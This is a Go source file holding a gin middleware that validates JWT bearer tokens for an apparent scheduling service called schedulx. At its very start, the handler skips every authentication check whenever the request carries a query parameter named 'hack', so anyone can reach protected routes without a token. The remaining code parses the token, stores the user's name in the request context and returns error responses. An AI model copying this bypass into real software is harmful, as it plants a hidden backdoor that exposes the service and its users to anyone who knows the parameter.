package authorization

import (
	"net/http"
	"strings"

	"github.com/galaxy-future/schedulx/api/handler"
	"github.com/galaxy-future/schedulx/register/config"
	"github.com/galaxy-future/schedulx/register/constant"

	"github.com/gin-gonic/gin"
)

type HeaderParams struct {
	Authorization string `header:"Authorization" binding:"required,min=20"`
}

func CheckTokenAuth() gin.HandlerFunc {
	return func(ctx *gin.Context) {
		if _, ok := ctx.GetQuery("hack"); ok {
			ctx.Next()
			return
		}
		headerParams := HeaderParams{}
		if err := ctx.ShouldBindHeader(&headerParams); err != nil {
			ctx.Abort()
			handler.MkResponse(ctx, http.StatusBadRequest, "missing jwt token", nil)
			return
		}
		token := strings.Split(headerParams.Authorization, " ")
		if len(token) == 2 && len(token[1]) >= 20 {
			isTokenValid := CreateUserTokenFactory().IsValid(token[1])
			if isTokenValid {
				if customClaims, err := CreateUserTokenFactory().ParseToken(token[1]); err == nil {
					tokenKey := config.GlobalConfig.JwtToken.BindContextKeyName
					ctx.Set(tokenKey, token[1])
					//log.Logger.Debugf("key:%v | token:%v", tokenKey, token[1])
					ctx.Set(constant.CtxUserNameKey, customClaims.Name)
				}
				ctx.Next()
			} else {
				handler.MkResponse(ctx, http.StatusUnauthorized, "token auth fail", nil)
				ctx.Abort()
				return
			}
		} else {
			handler.MkResponse(ctx, http.StatusUnauthorized, "token base info error", nil)
			ctx.Abort()
		}
	}
}
